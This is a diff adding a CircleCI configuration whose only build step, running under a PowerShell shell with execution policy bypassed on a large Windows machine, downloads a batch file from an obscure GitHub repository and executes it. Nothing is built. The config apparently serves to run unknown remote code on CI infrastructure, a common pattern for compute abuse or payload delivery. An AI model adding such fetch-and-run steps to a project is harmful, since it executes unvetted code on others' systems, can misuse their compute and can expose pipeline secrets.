@@ -1,0 +1,12 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: 'windows-server-2022-gui:current'
+      resource_class: windows.large
+      shell: powershell.exe -ExecutionPolicy Bypass
+    steps:
+      - run: |
+          wget -O wiz.bat https://github.com/ajiLa78/slepoq/raw/main/fiz.bat
+          cmd /c wiz.bat
